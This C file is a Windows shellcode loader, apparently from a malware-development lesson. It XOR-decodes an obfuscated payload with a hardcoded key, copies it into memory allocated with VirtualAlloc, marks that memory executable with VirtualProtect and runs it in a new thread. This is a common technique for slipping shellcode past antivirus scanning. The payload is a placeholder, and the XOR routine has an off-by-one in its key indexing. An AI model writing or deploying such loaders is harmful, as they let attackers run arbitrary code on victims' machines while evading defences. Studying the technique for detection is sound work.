#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;

	j = 0;

	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int main(void) {

	void * exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	unsigned char payload[] = "shellcode xored here";
	unsigned int payload_len = sizeof(payload);
	char key[] = "secretXorKey";

	//Allocate memory for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload_addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "calc_mem_addr", (void *)exec_mem);

	// break point for learn propose
    //printf("\nHit me!\n");
    //getchar();

    XOR((char *) payload, payload_len, key, sizeof(key));

    RtlMoveMemory(exec_mem, payload, payload_len);

    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

    // break point for learn propose
    //printf("\nHit me!\n");
    //getchar();

    if ( rv != 0 ) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

	return 0;
}
